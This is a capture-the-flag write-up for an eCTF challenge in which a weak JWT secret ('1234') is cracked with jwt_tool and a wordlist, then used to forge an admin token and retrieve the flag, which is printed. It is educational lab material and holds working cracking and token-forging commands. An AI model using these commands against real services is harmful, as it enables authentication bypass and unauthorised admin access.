**Challenge Name: Java Weak Token**    

**Description:**  
The admin has stored a flag in the admin section, but he let you access the page since he has secured the access to it. Maybe you should show him why using a weak secret isn't a good idea 🙂.  

Deploy the instance here to play: [https://instances.ectf.fr/](https://instances.ectf.fr/)  

**Flag format:** ectf{.....}  

---

**Challenge Files/Instance:**  
[Instance](http://instances.ectf.fr:24082/)  

---

**Solution:**  
1. Tried editing the JWT token and changing the user to `admin`.  
2. Submitting the modified token fails.  
3. Attempted to crack the JWT secret using `jwt_tool` and a wordlist (`rockyou.txt`).  

```bash
python3 jwt_tool.py --crack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3Mzg0Nzg2NjV9.eIDJENArei1f2Febvqwc7FM074_9FHBnl3v2HLroN2A -d /usr/share/wordlists/rockyou.txt  
```

4. Successfully cracked the JWT secret: `1234`.  
5. Used `jwt_tool.py` to modify the username to `admin` and resign the token.  

```bash
python3 jwt_tool.py -S hs256 -p "1234" -I eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM4NDc4NzE2fQ.DBwZQJ7ih7cA0lPnkqy9ePnYKWW-EnY21YW4HF_evQ0  
```

6. Sent the modified token in a request using Burp Suite.  

![Burp](Resources/image1.png)  

7. Successfully accessed the admin panel and retrieved the flag.  

**Flag:**  
ectf{JwT_T0keN_cR34t0r}

